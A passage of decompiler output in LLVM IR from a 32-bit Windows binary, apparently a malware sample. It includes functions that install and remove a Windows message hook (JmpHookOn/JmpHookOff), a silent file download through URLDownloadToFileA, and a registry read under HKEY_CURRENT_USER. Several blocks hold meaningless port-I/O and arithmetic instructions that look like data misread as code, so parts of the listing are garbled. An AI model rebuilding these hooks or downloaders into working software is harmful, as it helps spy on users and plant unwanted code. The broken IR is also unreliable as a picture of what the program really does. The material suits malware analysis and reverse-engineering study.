  store i32 %22, i32* %23, align 4, !insn.addr !530
  store i32 %arg1, i32* %eax, align 4, !insn.addr !531
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !532
  %25 = load i8, i8* %24, align 1, !insn.addr !532
  %26 = trunc i32 %arg1 to i8, !insn.addr !532
  %27 = add i8 %25, %26, !insn.addr !532
  store i8 %27, i8* %24, align 1, !insn.addr !532
  %28 = trunc i32 %arg3 to i16, !insn.addr !533
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !533
  %30 = load i32, i32* %29, align 4, !insn.addr !533
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !533
  %31 = add i32 %arg5, 67, !insn.addr !534
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !534
  %34 = load i32, i32* %33, align 4, !insn.addr !534
  %35 = load i8, i8* %24, align 1, !insn.addr !535
  %36 = add i8 %35, %26, !insn.addr !535
  store i8 %36, i8* %24, align 1, !insn.addr !535
  %37 = mul i32 %34, 1557718248, !insn.addr !536
  %38 = add i32 %arg7, 97, !insn.addr !536
  %39 = add i32 %38, %37, !insn.addr !536
  %40 = inttoptr i32 %39 to i8*, !insn.addr !536
  %41 = load i8, i8* %40, align 1, !insn.addr !536
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !536
  %44 = add i8 %43, %41, !insn.addr !536
  %45 = icmp eq i8 %44, 0, !insn.addr !536
  store i8 %44, i8* %40, align 1, !insn.addr !536
  br i1 %45, label %dec_label_pc_404f35, label %dec_label_pc_404ec3, !insn.addr !537

dec_label_pc_404ec3:                              ; preds = %dec_label_pc_404e99
  %46 = load i32, i32* %eax, align 4, !insn.addr !538
  ret i32 %46, !insn.addr !538

dec_label_pc_404ecc:                              ; preds = %dec_label_pc_404e96
  %47 = trunc i32 %6 to i8
  %48 = mul i32 %1, 256
  %49 = and i32 %48, 65280
  %50 = xor i32 %5, %49, !insn.addr !539
  %51 = bitcast i32* %eax to i8*
  %52 = mul i8 %47, 2, !insn.addr !540
  %53 = inttoptr i32 %6 to i8*, !insn.addr !540
  store i8 %52, i8* %53, align 1, !insn.addr !540
  %54 = add i32 %3, 104, !insn.addr !541
  %55 = inttoptr i32 %54 to i8*, !insn.addr !541
  %56 = load i8, i8* %55, align 1, !insn.addr !541
  %57 = udiv i32 %4, 256, !insn.addr !541
  %58 = trunc i32 %57 to i8, !insn.addr !541
  %59 = add i8 %56, %58, !insn.addr !541
  store i8 %59, i8* %55, align 1, !insn.addr !541
  %60 = trunc i32 %4 to i16, !insn.addr !542
  %61 = call i8 @__asm_insb(i16 %60), !insn.addr !542
  %62 = inttoptr i32 %0 to i8*, !insn.addr !542
  store i8 %61, i8* %62, align 1, !insn.addr !542
  %63 = call i8 @__asm_insb(i16 %60), !insn.addr !543
  store i8 %63, i8* %62, align 1, !insn.addr !543
  %64 = xor i32 %4, %1, !insn.addr !544
  %65 = call i8 @__asm_insb(i16 %60), !insn.addr !545
  store i8 %65, i8* %62, align 1, !insn.addr !545
  %66 = call i8 @__asm_insb(i16 %60), !insn.addr !546
  store i8 %66, i8* %62, align 1, !insn.addr !546
  %67 = load i8, i8* %55, align 1, !insn.addr !547
  %68 = trunc i32 %4 to i8, !insn.addr !547
  %69 = add i8 %67, %68, !insn.addr !547
  store i8 %69, i8* %55, align 1, !insn.addr !547
  %70 = call i8 @__asm_insb(i16 %60), !insn.addr !548
  store i8 %70, i8* %62, align 1, !insn.addr !548
  %71 = call i8 @__asm_insb(i16 %60), !insn.addr !549
  store i8 %71, i8* %62, align 1, !insn.addr !549
  %72 = add i32 %2, 117, !insn.addr !550
  %73 = inttoptr i32 %72 to i16*, !insn.addr !550
  %74 = load i16, i16* %73, align 2, !insn.addr !550
  %75 = trunc i32 %64 to i16, !insn.addr !550
  call void @__asm_arpl(i16 %74, i16 %75), !insn.addr !550
  %76 = load i8, i8* %51, align 4, !insn.addr !551
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !551
  %79 = add i8 %76, %78, !insn.addr !551
  %80 = inttoptr i32 %77 to i8*, !insn.addr !551
  store i8 %79, i8* %80, align 1, !insn.addr !551
  %81 = add i32 %50, 82, !insn.addr !552
  %82 = inttoptr i32 %81 to i8*, !insn.addr !552
  %83 = load i8, i8* %82, align 1, !insn.addr !552
  %84 = add i8 %83, %68, !insn.addr !552
  store i8 %84, i8* %82, align 1, !insn.addr !552
  %85 = load i32, i32* %eax, align 4, !insn.addr !553
  %86 = add i32 %85, -1, !insn.addr !553
  %87 = add i32 %50, 4227321, !insn.addr !554
  %88 = inttoptr i32 %87 to i8*, !insn.addr !554
  %89 = load i8, i8* %88, align 1, !insn.addr !554
  %90 = udiv i32 %86, 256, !insn.addr !554
  %91 = trunc i32 %90 to i8, !insn.addr !554
  %92 = add i8 %89, %91, !insn.addr !554
  store i8 %92, i8* %88, align 1, !insn.addr !554
  ret i32 %86, !insn.addr !554

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404e94
  ret i32 %6, !insn.addr !555

dec_label_pc_404f35:                              ; preds = %dec_label_pc_404e99
  %93 = call i32 @CallNextHookEx(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !556
  ret i32 %93, !insn.addr !557
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_404f40:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4214560 to i32*), i32 3), !insn.addr !558
  %2 = ptrtoint i32* %1 to i32, !insn.addr !558
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !559
  %3 = icmp eq i32* %1, null, !insn.addr !560
  %4 = icmp eq i1 %3, false, !insn.addr !561
  %5 = sext i1 %4 to i32, !insn.addr !562
  ret i32 %5, !insn.addr !563
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_404f6c:
  %0 = load i32, i32* @global_var_40969c, align 4, !insn.addr !564
  %1 = inttoptr i32 %0 to i32*, !insn.addr !565
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !565
  %3 = sext i1 %2 to i32, !insn.addr !565
  ret i32 %3, !insn.addr !566
}

define i32 @function_404f78() local_unnamed_addr {
dec_label_pc_404f78:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !567
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !567
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !567
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !568
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !569
  %3 = add i32 %2, 1, !insn.addr !569
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !569
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !570
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !571
  ret i32 0, !insn.addr !572
}

define i32 @function_404f9d() local_unnamed_addr {
dec_label_pc_404f9d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !573
  ret i32 %0, !insn.addr !573
}

define i32 @function_404fa2() local_unnamed_addr {
dec_label_pc_404fa2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !574
}

define i32 @function_404fa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fa4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !575
}

define i32 @function_404fa8() local_unnamed_addr {
dec_label_pc_404fa8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !576
  %2 = add i32 %1, -1, !insn.addr !576
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !576
  ret i32 %0, !insn.addr !577
}

define i32 @function_404fb0() local_unnamed_addr {
dec_label_pc_404fb0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !578
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !578
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !578
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !579
  %2 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !580
  %3 = add i32 %2, 1, !insn.addr !580
  store i32 %3, i32* @global_var_4096a0, align 4, !insn.addr !580
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !581
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !582
  ret i32 0, !insn.addr !583
}

define i32 @function_404fd5() local_unnamed_addr {
dec_label_pc_404fd5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !584
  ret i32 %0, !insn.addr !584
}

define i32 @function_404fda() local_unnamed_addr {
dec_label_pc_404fda:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !585
}

define i32 @function_404fdc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fdc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !586
}

define i32 @function_404fe0() local_unnamed_addr {
dec_label_pc_404fe0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !587
  %2 = add i32 %1, -1, !insn.addr !587
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !587
  ret i32 %0, !insn.addr !588
}

define i32 @function_404fe8() local_unnamed_addr {
dec_label_pc_404fe8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !589
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !589
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !589
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !590
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !591
  %3 = add i32 %2, 1, !insn.addr !591
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !591
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !592
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !593
  ret i32 0, !insn.addr !594
}

define i32 @function_40500d() local_unnamed_addr {
dec_label_pc_40500d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !595
  ret i32 %0, !insn.addr !595
}

define i32 @function_405012() local_unnamed_addr {
dec_label_pc_405012:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !596
}

define i32 @function_405014(i32 %arg1) local_unnamed_addr {
dec_label_pc_405014:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !597
}

define i32 @function_405018() local_unnamed_addr {
dec_label_pc_405018:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !598
  %2 = add i32 %1, -1, !insn.addr !598
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !598
  ret i32 %0, !insn.addr !599
}

define i32 @function_405020(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_405020:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !600
  ret i32 %0, !insn.addr !600
}

define i32 @function_405028() local_unnamed_addr {
dec_label_pc_405028:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !601
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !601
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !601
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !602
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !603
  %3 = add i32 %2, 1, !insn.addr !603
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !603
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !604
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !605
  ret i32 0, !insn.addr !606
}

define i32 @function_40504d() local_unnamed_addr {
dec_label_pc_40504d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !607
  ret i32 %0, !insn.addr !607
}

define i32 @function_405052() local_unnamed_addr {
dec_label_pc_405052:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !608
}

define i32 @function_405054(i32 %arg1) local_unnamed_addr {
dec_label_pc_405054:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !609
}

define i32 @function_405058() local_unnamed_addr {
dec_label_pc_405058:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !610
  %2 = add i32 %1, -1, !insn.addr !610
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !610
  ret i32 %0, !insn.addr !611
}

define i32 @function_405060() local_unnamed_addr {
dec_label_pc_405060:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !612
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_405064, label %dec_label_pc_40506d, !insn.addr !613

dec_label_pc_405064:                              ; preds = %dec_label_pc_405060
  %4 = add nuw nsw i32 %3, 48, !insn.addr !614
  ret i32 %4, !insn.addr !615

dec_label_pc_40506d:                              ; preds = %dec_label_pc_405060
  %5 = add nuw nsw i32 %3, 55, !insn.addr !616
  ret i32 %5, !insn.addr !617
}

define i32 @function_405078() local_unnamed_addr {
dec_label_pc_405078:
  %esp.2.reg2mem = alloca i32, !insn.addr !618
  %esp.1.reg2mem = alloca i32, !insn.addr !618
  %cf.0.reg2mem = alloca i1, !insn.addr !618
  %esi.0.reg2mem = alloca i32, !insn.addr !618
  %esp.0.reg2mem = alloca i32, !insn.addr !618
  %ebx.0.reg2mem = alloca i32, !insn.addr !618
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !619
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !620
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !620
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !620
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !621
  %4 = call i32 @"@LStrClr"(), !insn.addr !622
  %5 = call i32 @function_4034f4(), !insn.addr !623
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !624
  br i1 %6, label %dec_label_pc_405179, label %dec_label_pc_4050c5.preheader, !insn.addr !624

dec_label_pc_4050c5.preheader:                    ; preds = %dec_label_pc_405078
  %7 = add i32 %0, -1, !insn.addr !625
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_4050c5

dec_label_pc_4050c5:                              ; preds = %dec_label_pc_4050c5.preheader, %dec_label_pc_405171
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !625
  %9 = inttoptr i32 %8 to i8*, !insn.addr !625
  %10 = load i8, i8* %9, align 1, !insn.addr !625
  %11 = icmp eq i8 %10, 32, !insn.addr !625
  %12 = icmp eq i1 %11, false, !insn.addr !626
  br i1 %12, label %dec_label_pc_4050e0, label %dec_label_pc_4050cf, !insn.addr !626

dec_label_pc_4050cf:                              ; preds = %dec_label_pc_4050c5
  %13 = call i32 @"@LStrCat"(), !insn.addr !627
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !628
  br label %dec_label_pc_405171, !insn.addr !628

dec_label_pc_4050e0:                              ; preds = %dec_label_pc_4050c5
  %14 = icmp ult i8 %10, 32, !insn.addr !629
  br i1 %14, label %dec_label_pc_405103, label %dec_label_pc_4050ea, !insn.addr !630

dec_label_pc_4050ea:                              ; preds = %dec_label_pc_4050e0
  %15 = add i8 %10, -32, !insn.addr !631
  %16 = icmp ult i8 %15, 95, !insn.addr !632
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !633
  br i1 %17, label %dec_label_pc_4050f7, label %dec_label_pc_405101, !insn.addr !633

dec_label_pc_4050f7:                              ; preds = %dec_label_pc_4050ea
  %18 = load i32, i32* inttoptr (i32 4215224 to i32*), align 8, !insn.addr !634
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !634
  %21 = shl i32 1, %20, !insn.addr !634
  %22 = and i32 %18, %21, !insn.addr !634
  %23 = icmp ne i32 %22, 0, !insn.addr !634
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !634
  br label %dec_label_pc_405101, !insn.addr !634

dec_label_pc_405101:                              ; preds = %dec_label_pc_4050ea, %dec_label_pc_4050f7
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !635
  br i1 %24, label %dec_label_pc_405158, label %dec_label_pc_405103, !insn.addr !635

dec_label_pc_405103:                              ; preds = %dec_label_pc_405101, %dec_label_pc_4050e0
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !636
  %27 = add i32 %esp.0.reload, -4, !insn.addr !637
  %28 = inttoptr i32 %27 to i32*, !insn.addr !637
  store i32 %26, i32* %28, align 4, !insn.addr !637
  %29 = add i32 %esp.0.reload, -8, !insn.addr !638
  %30 = inttoptr i32 %29 to i32*, !insn.addr !638
  store i32 ptrtoint (i32* @global_var_4051cc to i32), i32* %30, align 4, !insn.addr !638
  %31 = call i32 @function_405060(), !insn.addr !639
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !640
  %33 = add i32 %esp.0.reload, -12, !insn.addr !641
  %34 = inttoptr i32 %33 to i32*, !insn.addr !641
  store i32 0, i32* %34, align 4, !insn.addr !641
  %35 = call i32 @function_405060(), !insn.addr !642
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !643
  %37 = add i32 %esp.0.reload, -16, !insn.addr !644
  %38 = inttoptr i32 %37 to i32*, !insn.addr !644
  store i32 0, i32* %38, align 4, !insn.addr !644
  %39 = call i32 @"@LStrCatN"(), !insn.addr !645
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !646
  br label %dec_label_pc_405171, !insn.addr !646

dec_label_pc_405158:                              ; preds = %dec_label_pc_405101
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !647
  %41 = call i32 @"@LStrCat"(), !insn.addr !648
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !648
  br label %dec_label_pc_405171, !insn.addr !648

dec_label_pc_405171:                              ; preds = %dec_label_pc_405158, %dec_label_pc_405103, %dec_label_pc_4050cf
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !649
  %43 = add i32 %esi.0.reload, -1, !insn.addr !650
  %44 = icmp eq i32 %43, 0, !insn.addr !650
  %45 = icmp eq i1 %44, false, !insn.addr !651
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !651
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !651
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !651
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !651
  br i1 %45, label %dec_label_pc_4050c5, label %dec_label_pc_405179, !insn.addr !651

dec_label_pc_405179:                              ; preds = %dec_label_pc_405171, %dec_label_pc_405078
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !652
  %47 = load i32, i32* %46, align 4, !insn.addr !652
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !653
  %48 = add i32 %esp.2.reload, 8, !insn.addr !654
  %49 = inttoptr i32 %48 to i32*, !insn.addr !654
  store i32 4215203, i32* %49, align 4, !insn.addr !654
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !655
  %51 = call i32 @"@LStrClr"(), !insn.addr !656
  ret i32 %51, !insn.addr !657
}

define i32 @function_40519c() local_unnamed_addr {
dec_label_pc_40519c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !658
  ret i32 %0, !insn.addr !658
}

define i32 @function_4051a1() local_unnamed_addr {
dec_label_pc_4051a1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !659
}

define i32 @function_4051a3(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !660
}

define i32 @function_4051c7() local_unnamed_addr {
dec_label_pc_4051c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !661
  %2 = inttoptr i32 %0 to i32*, !insn.addr !661
  store i32 %1, i32* %2, align 4, !insn.addr !661
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !662
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !662
  %7 = add i8 %4, %6, !insn.addr !662
  %8 = inttoptr i32 %5 to i8*, !insn.addr !662
  store i8 %7, i8* %8, align 1, !insn.addr !662
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !663
  %10 = load i32, i32* %eax, align 4, !insn.addr !663
  %11 = udiv i32 %10, 256, !insn.addr !663
  %12 = trunc i32 %11 to i8, !insn.addr !663
  %13 = add i8 %9, %12, !insn.addr !663
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !663
  %14 = call i32 @function_4036e4(), !insn.addr !664
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !665
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !665
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !665
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !666
  %17 = call i32 @"@LStrCatN"(), !insn.addr !667
  %18 = call i32 @function_4036f4(), !insn.addr !668
  %19 = inttoptr i32 %18 to i32*, !insn.addr !669
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !669
  call void @__writefsdword(i32 0, i32 0), !insn.addr !670
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !671
  ret i32 %21, !insn.addr !672
}

define i32 @function_4051d0() local_unnamed_addr {
dec_label_pc_4051d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_40523e() local_unnamed_addr {
dec_label_pc_40523e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !673
  ret i32 %0, !insn.addr !673
}

define i32 @function_405243() local_unnamed_addr {
dec_label_pc_405243:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !674
}

define i32 @function_405245(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405245:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !675
}

define i32 @function_40524f() local_unnamed_addr {
dec_label_pc_40524f:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !676
  %5 = inttoptr i32 %3 to i32*, !insn.addr !676
  store i32 %4, i32* %5, align 4, !insn.addr !676
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !677
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !677
  %10 = add i8 %7, %9, !insn.addr !677
  %11 = inttoptr i32 %8 to i8*, !insn.addr !677
  store i8 %10, i8* %11, align 1, !insn.addr !677
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !678
  %14 = udiv i32 %1, 256, !insn.addr !678
  %15 = trunc i32 %14 to i8, !insn.addr !678
  %16 = add i8 %13, %15, !insn.addr !678
  %17 = load i32, i32* %edi, align 4, !insn.addr !678
  %18 = inttoptr i32 %17 to i8*, !insn.addr !678
  store i8 %16, i8* %18, align 1, !insn.addr !678
  %19 = load i8, i8* %6, align 4, !insn.addr !679
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !679
  %22 = add i8 %19, %21, !insn.addr !679
  %23 = inttoptr i32 %20 to i8*, !insn.addr !679
  store i8 %22, i8* %23, align 1, !insn.addr !679
  %24 = add i32 %0, -117, !insn.addr !680
  %25 = inttoptr i32 %24 to i8*, !insn.addr !680
  %26 = load i8, i8* %25, align 1, !insn.addr !680
  %27 = trunc i32 %2 to i8, !insn.addr !680
  %28 = add i8 %26, %27, !insn.addr !680
  store i8 %28, i8* %25, align 1, !insn.addr !680
  %29 = trunc i32 %2 to i16, !insn.addr !681
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !681
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !682
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !682
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !682
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !683
  %33 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !684
  %34 = add i32 %33, 1, !insn.addr !684
  store i32 %34, i32* @global_var_4096ac, align 4, !insn.addr !684
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !685
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !686
  ret i32 0, !insn.addr !687
}

define i32 @function_40527d() local_unnamed_addr {
dec_label_pc_40527d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !688
  ret i32 %0, !insn.addr !688
}

define i32 @function_405282() local_unnamed_addr {
dec_label_pc_405282:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !689
}

define i32 @function_405284(i32 %arg1) local_unnamed_addr {
dec_label_pc_405284:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !690
}

define i32 @function_405288() local_unnamed_addr {
dec_label_pc_405288:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !691
  %2 = add i32 %1, -1, !insn.addr !691
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !691
  ret i32 %0, !insn.addr !692
}

define i32 @function_405290() local_unnamed_addr {
dec_label_pc_405290:
  %eax.0.reg2mem = alloca i32, !insn.addr !693
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !694
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !695
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !696
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_40531c, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !697
  %1 = call i32 @function_4043b8(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_40531c, i32 0, i32 0), i32 -2147483647), !insn.addr !698
  %2 = icmp eq i32 %1, 0, !insn.addr !699
  %3 = icmp eq i1 %2, false, !insn.addr !700
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !700
  br i1 %3, label %dec_label_pc_40530a, label %dec_label_pc_4052c5, !insn.addr !700

dec_label_pc_4052c5:                              ; preds = %dec_label_pc_405290
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !701
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !702
  %5 = call i32 @function_4043c0(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_408104, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_405338, i32 0, i32 0), i32 -2147483647), !insn.addr !702
  %6 = icmp eq i32 %5, 0, !insn.addr !703
  %7 = icmp eq i1 %6, false, !insn.addr !704
  br i1 %7, label %dec_label_pc_405301, label %dec_label_pc_4052f1, !insn.addr !704

dec_label_pc_4052f1:                              ; preds = %dec_label_pc_4052c5
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !705
  br label %dec_label_pc_405301, !insn.addr !705

dec_label_pc_405301:                              ; preds = %dec_label_pc_4052f1, %dec_label_pc_4052c5
  %9 = call i32 @function_4043a0(), !insn.addr !706
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !706
  br label %dec_label_pc_40530a, !insn.addr !706

dec_label_pc_40530a:                              ; preds = %dec_label_pc_405301, %dec_label_pc_405290
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !707
}

define i32 @function_405313(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_405313:
  %esp.1.reg2mem = alloca i32, !insn.addr !708
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !708
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
